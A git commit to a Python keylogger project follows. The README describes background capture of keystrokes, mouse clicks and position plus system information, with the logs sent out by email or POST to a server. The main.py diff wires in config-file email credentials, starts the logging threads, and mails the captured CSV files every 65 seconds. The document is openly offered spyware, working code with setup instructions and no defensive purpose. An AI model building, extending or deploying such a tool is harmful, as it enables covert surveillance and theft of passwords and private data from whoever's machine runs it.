c759b3ddfff90fad48d5af9ff8c75295d8c9d0e4
Aditya <adityajha2103@gmail.com>
2023-10-08 12:44:06 +0530

    Added config.json file and updated README.md - Added config file to store all requried information - Added README.md - Updated main.py file to extract information from config.json file - Updated requirements.txt file to include all the requirements.

--- README.md
+++ README.md
@@ -1,2 +1,73 @@
 # KeyLogger
-A Simple KeyLogger made in python
+A Simple KeyLogger made in python. It can perform various operations while running in the background.
+
+## Functions Available
+- Mail
+- KeyLogger
+- Mouse Clicks
+- Mouse Position
+- POST data to server
+- Get System Information
+
+## Installation
+### 1. Clone this repository
+```bash
+git clone https://github.com/aditya955/KeyLogger.git
+cd KeyLogger
+```
+
+### 2. Install the requirements
+```bash
+pip install -r requirements.txt
+```
+
+*Note:* Some distributions of Linux may require you to use their own package manager like `apt` for debian based distributions and `pacman` for arch based distributions to install the requirements.
+Example:
+```bash
+sudo apt install python3-requests
+sudo pacman -S python-requests
+```
+
+## Configuration
+Configure `config.json` to your needs.
+
+### 1. Keystrokes
+To log the keystrokes.
+
+`save`: Whether to save the keystrokes to a file or not. (Default = True)
+
+`interval`: The interval in seconds after which the keystrokes are saved to the file. (Default = 60 ie. 1 minute)
+
+
+### 2. Mail
+To send the logs to your mail.
+
+`email`: This is the email address from which you want to send the logs. (The email is sent to itself)
+
+`password`: This is the password of the email address from which you want to send the logs.
+
+`host`: This is the SMTP host of the email address from which you want to send the logs. (Default = Google SMTP)
+
+`port`: This is the SMTP port of the email address from which you want to send the logs. (Default = 465)
+
+
+### 3. Mouse
+To log the mouse clicks, scrolls and position.
+
+`save`: Whether to save the Mouse Records to a file or not. (Default = True)
+
+`interval`: The interval in seconds after which the keystrokes are saved to the file. (Default = 60 ie. 1 minute)
+
+
+### 4. POST Request
+To send the logs to a server.
+
+`url`: This is the URL of the server to which you want to send the logs.
+
+`confirmation`: Whether to receive POST confirmation or not. It returns true if server responds with status 200, otherwise false. (Default = False ie. Don't return confirmation).
+
+
+## Running the Script
+```bash
+python3 main.py
+```
--- main.py
+++ main.py
@@ -1,16 +1,43 @@
 import os
+import json
 import threading
 import Modules.Mailer as Mailer
 import Modules.KeyStroke as KeyStroke
+import Modules.SystemInfo as SystemInfo
 import Modules.MouseRecorder as MouseRecorder
 
 if __name__ == '__main__':
-    email = os.environ.get("EMAIL") # Enter your email address here
-    password = os.environ.get("PASSWORD") # Enter your password here
-    mailer = Mailer.Mailer(email, password)
+    # Open JSON file and load data
+    with open("config.json", 'r') as f:
+        data = json.load(f)
+    
+    # Extracting data from JSON file
+    # Mail Information
+    EMAIL = data['mail']['email']
+    PASSWORD = data['mail']['password']
+    HOST = data['mail']['host']
+    PORT = data['mail']['port']
+
+    # Keylogger Information
+    SAVE = data['keylogger']['save']
+    INTERVAL = data['keylogger']['interval']
+
+    # MouseLogger Information
+    SAVE_MOUSE = data['mouselogger']['save']
+    INTERVAL_MOUSE = data['mouselogger']['interval'] 
+
+    mailer = Mailer.Mailer(email=EMAIL, password=PASSWORD, host=HOST, port=PORT)
+
+    #  Extracts and Mails system information
+    system_info = SystemInfo.SystemInfo.get_info()  # Gets System Information
+    mailer.plain_mail(EMAIL, "System Information", system_info)  # Sends System Information
+
     try:
-        threading.Thread(target=KeyStroke.KeyLogger).start()
-        threading.Thread(target=MouseRecorder.MouseLogger).start()
-        threading.Timer(65, mailer.attachment_mail, args=[email, "Keystrokes", ["filtered_keystrokes.csv", "complete_keystrokes.csv", "mouse-click.csv"], "Keystrokes"]).start()
+        threading.Thread(target=KeyStroke.KeyLogger, args=[SAVE, INTERVAL]).start()    # Starts KeyLogger
+        threading.Thread(target=MouseRecorder.MouseLogger, args=[SAVE_MOUSE, INTERVAL_MOUSE]).start()  # Starts MouseLogger
+
+        # Sends Keystrokes and Mouse Clicks every 65 seconds
+        # 65 seconds is specified so that keylogger and mouselogger gets enough time to record keystrokes and mouse clicks
+        threading.Timer(65, mailer.attachment_mail, args=[EMAIL, "Keystrokes", ["filtered_keystrokes.csv", "complete_keystrokes.csv", "mouse-click.csv"], "Keystrokes"]).start()
     except KeyboardInterrupt as e:
         pass
